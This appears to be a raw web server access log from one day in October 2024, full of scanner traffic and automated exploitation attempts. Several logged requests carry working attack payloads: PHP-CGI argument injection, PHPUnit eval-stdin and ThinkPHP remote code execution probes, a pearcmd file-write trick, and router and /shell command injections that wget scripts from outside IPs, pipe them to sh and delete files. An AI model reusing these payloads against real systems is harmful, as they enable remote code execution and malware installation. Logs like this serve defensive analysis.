135.125.244.48 - - [01/Oct/2024:10:10:06 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.186.101.138 - - [01/Oct/2024:10:11:00 +0900] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
34.209.251.76 - - [01/Oct/2024:10:34:21 +0900] "OPTIONS / HTTP/1.1" 404 1066 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
54.219.133.10 - - [01/Oct/2024:10:44:06 +0900] "OPTIONS / HTTP/1.1" 404 1066 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
95.214.55.138 - - [01/Oct/2024:11:00:54 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
8.211.162.45 - - [01/Oct/2024:11:07:05 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 zgrab/0.x"
8.220.201.94 - - [01/Oct/2024:11:17:58 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 166 "-" "-"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 2427 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2479 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2467 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2455 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2443 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 2464 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2458 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2446 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2434 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:17:59 +0900] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2422 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2470 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2458 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2446 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2434 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2503 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2488 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2488 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:00 +0900] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2503 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2530 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2497 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2500 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2494 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:01 +0900] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2491 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:02 +0900] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 2465 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:02 +0900] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 2486 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:02 +0900] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 2482 "-" "Custom-AsyncHttpClient"
8.220.201.94 - - [01/Oct/2024:11:18:02 +0900] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 2396 "-" "Custom-AsyncHttpClient"
3.238.233.160 - - [01/Oct/2024:11:28:35 +0900] "GET /.git/HEAD HTTP/1.1" 404 2353 "-" "Python-urllib/3.12"
3.238.233.160 - - [01/Oct/2024:11:40:28 +0900] "GET /.git/HEAD HTTP/1.1" 404 2353 "-" "Python-urllib/3.12"
31.220.1.144 - - [01/Oct/2024:11:48:04 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 2518 "-" "Go-http-client/1.1"
135.125.244.48 - - [01/Oct/2024:12:16:54 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:12:16:55 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.47 - - [01/Oct/2024:12:53:46 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
64.62.156.52 - - [01/Oct/2024:13:50:48 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
64.62.156.59 - - [01/Oct/2024:13:52:44 +0900] "GET /webui/ HTTP/1.1" 404 1073 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
64.62.156.61 - - [01/Oct/2024:13:55:22 +0900] "GET /geoserver/web/ HTTP/1.1" 404 1080 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
13.83.41.6 - - [01/Oct/2024:14:21:18 +0900] "GET /ReportServer HTTP/1.1" 404 1078 "-" "Mozilla/5.0 zgrab/0.x"
135.125.244.48 - - [01/Oct/2024:14:35:14 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:14:35:14 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.23.229.214 - - [01/Oct/2024:14:40:36 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Xq\x113\xFFn\xB3\xAB?\xFD1\xD3\x8AY\xD0?\xEFRQ\xBD\xEC\xCD\x8F\xAD\xC3\xDC\xC0?&\xC8y'\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
64.23.229.214 - - [01/Oct/2024:14:40:36 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x14\xBE\xC11>\x5C\x85\x19\xAA\x83\xE4P<\xCA\xC0E\xEA~" 400 166 "-" "-"
64.23.229.214 - - [01/Oct/2024:14:40:36 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.229.214 - - [01/Oct/2024:14:40:37 +0900] "GET /form.html HTTP/1.1" 404 1075 "-" "curl/8.1.2"
64.23.229.214 - - [01/Oct/2024:14:40:37 +0900] "GET /upl.php HTTP/1.1" 404 1075 "-" "Mozilla/5.0"
64.23.229.214 - - [01/Oct/2024:14:40:37 +0900] "GET /t4 HTTP/1.1" 404 1069 "-" "Mozilla/5.0"
64.23.229.214 - - [01/Oct/2024:14:40:38 +0900] "GET /geoip/ HTTP/1.1" 404 1072 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.229.214 - - [01/Oct/2024:14:40:38 +0900] "GET /1.php HTTP/1.1" 404 1072 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.229.214 - - [01/Oct/2024:14:40:38 +0900] "GET /systembc/password.php HTTP/1.1" 404 1087 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.23.229.214 - - [01/Oct/2024:14:40:39 +0900] "GET /password.php HTTP/1.1" 404 1079 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
18.171.235.13 - - [01/Oct/2024:14:48:55 +0900] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
103.186.101.138 - - [01/Oct/2024:14:49:02 +0900] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
45.79.181.251 - - [01/Oct/2024:14:55:02 +0900] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x12\xF5f2\xF6\x12\xF8\x08\x92\xBE\x9A\x81\x15\xCF.e\x96\xD8`O%\xC65\x85\xC4~\xE6\xA4\xD3\xCC-\xA0 \xF18x/\x92\xB5\x86\xCE\xD3=,Lq\xAD!\xC5\xB7c$\xF1\xAA(\x86\x83\x19\xCB\xAC\xD6\xDE\x05$\x97\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
45.79.168.172 - - [01/Oct/2024:15:02:15 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [01/Oct/2024:15:02:25 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.55.43 - - [01/Oct/2024:15:38:58 +0900] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 2519 "-" "Go-http-client/1.1"
205.210.31.35 - - [01/Oct/2024:15:42:43 +0900] "GET / HTTP/1.0" 200 615 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.244.48 - - [01/Oct/2024:15:54:01 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:15:54:02 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.174.93.12 - - [01/Oct/2024:16:06:24 +0900] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
95.214.55.138 - - [01/Oct/2024:16:11:58 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.87.66.165 - - [01/Oct/2024:16:32:07 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3872.0 Safari/537.36 Edg/78.0.244.0"
40.83.128.23 - - [01/Oct/2024:16:37:15 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 zgrab/0.x"
18.171.235.13 - - [01/Oct/2024:17:30:43 +0900] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xC1Q,\x94i]\xD5\x22\x7Fe\xB0S\x05~6\xB8\xB2\x0BS\x0B\xF1UT\xB0\x1E\xAF[uq#6k\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
18.171.235.13 - - [01/Oct/2024:17:34:33 +0900] "GET /admin/index.html HTTP/1.1" 302 0 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'"
185.224.128.83 - - [01/Oct/2024:17:35:19 +0900] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 2411 "-" "-"
18.171.235.13 - - [01/Oct/2024:17:39:08 +0900] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03L\x12}-/w\xC6\xA8t5P\x8E\x18\x1B\xBC\x0C>\x8A\x87\xFE\x87\xC4U\xA0\x99\xBE<\xECE\xC1\xF44\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
18.171.235.13 - - [01/Oct/2024:17:42:50 +0900] "GET /index.html HTTP/1.1" 404 1074 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'"
184.105.139.69 - - [01/Oct/2024:17:50:21 +0900] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x03oZv\xE4}\xFBKo\xC1<nI\xFDe\xB0\xB3y\xA6t9\x9Bdr\xD9\xCD\xCCK,C'\xE7\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
135.125.244.48 - - [01/Oct/2024:17:50:55 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:17:50:55 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
18.171.235.13 - - [01/Oct/2024:17:51:19 +0900] "GET /+CSCOE+/logon.html HTTP/1.1" 404 1086 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'"
34.209.40.123 - - [01/Oct/2024:17:54:46 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
34.209.40.123 - - [01/Oct/2024:17:54:46 +0900] "GET / HTTP/1.1" 200 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
18.171.235.13 - - [01/Oct/2024:17:55:39 +0900] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xDF\x7F\x5Cf\xC1\xA9\xF8\xDA\x03`\x1CL\xC0\x5CU\x80\xE0\xEF\xC7\xC6!\x00QD\xDA1`\x82'\xF8\x04\xCB\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
185.224.128.59 - - [01/Oct/2024:17:56:08 +0900] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 2411 "-" "-"
18.171.235.13 - - [01/Oct/2024:17:59:17 +0900] "GET /cgi-bin/login.cgi HTTP/1.1" 404 1083 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'"
18.171.235.13 - - [01/Oct/2024:18:03:36 +0900] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xCCSf\x9D\x84%#@{\xF6\xFB\x03BMT3rm\xAE\xFEa\x5C\xF7R\x8F\xB0\xA7H\xA9\xDF\xC7\xFB\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
18.171.235.13 - - [01/Oct/2024:18:07:12 +0900] "GET /logon.htm HTTP/1.1" 404 1074 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)'"
18.237.67.230 - - [01/Oct/2024:18:07:13 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Android; Mobile; rv:35.0) Gecko/35.0 Firefox/35.0"
35.203.211.106 - - [01/Oct/2024:18:10:43 +0900] "GET / HTTP/1.1" 404 1064 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.244.48 - - [01/Oct/2024:18:14:23 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:18:14:23 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
18.171.235.13 - - [01/Oct/2024:18:18:42 +0900] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\x9D.d\xF5\xC57{\xD5.YF\x1B0\x17\xF7^\x07\x1Abu*\xDC\xE9(\x12\xFC\xBC\x13c\x14\x86\xD4\x00\x00P\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
35.87.66.165 - - [01/Oct/2024:19:04:16 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.107"
205.210.31.24 - - [01/Oct/2024:19:35:19 +0900] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF0\x96\xFE\xCE\xA4Q\x82\xF1\xDE\xFE\x9B\xC2\xA4\x06\xDBZ\x7F\x1CB\xBE\x8Ax\x07\x05\x9B\xB6'-\xFC\xB1\xAB\xA2 \xC9\x0F?j,\x81Y\x07ck~\xD2 ~\x0Eu|\xA8\xCC\x82{\xA1\xA6\x9DF4\xE0\xE5\xC4R M\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
205.210.31.24 - - [01/Oct/2024:19:35:19 +0900] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03q\xEC\xA5e^E$\x88\x96\x8DYC<\x19\xE5\x02\xB9\x11\xAD\xE26h\xA5\xB5H_:o\xDA`\xFD\x01\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
34.209.40.123 - - [01/Oct/2024:19:40:34 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
34.209.40.123 - - [01/Oct/2024:19:40:34 +0900] "GET / HTTP/1.1" 200 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
80.82.77.202 - - [01/Oct/2024:20:07:47 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:20:08:57 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [01/Oct/2024:20:08:58 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
197.33.208.0 - - [01/Oct/2024:20:11:34 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+82.165.221.158/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
197.33.208.0 - - [01/Oct/2024:20:11:35 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+82.165.221.158/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
197.33.208.0 - - [01/Oct/2024:20:11:40 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+82.165.221.158/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
197.33.208.0 - - [01/Oct/2024:20:11:40 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+82.165.221.158/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
46.174.191.30 - - [01/Oct/2024:20:16:27 +0900] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
175.124.165.54 - - [01/Oct/2024:20:28:38 +0900] "GET /home/ HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
40.118.213.55 - - [01/Oct/2024:20:32:40 +0900] "GET /manager/html HTTP/1.1" 404 1076 "-" "Mozilla/5.0 zgrab/0.x"
18.237.67.230 - - [01/Oct/2024:20:35:18 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
202.47.180.174 - - [01/Oct/2024:20:43:09 +0900] "GET / HTTP/1.1" 404 1061 "-" "python-requests/2.32.3"
35.205.94.32 - - [01/Oct/2024:20:55:48 +0900] "GET / HTTP/1.1" 404 1061 "-" "python-requests/2.32.3"
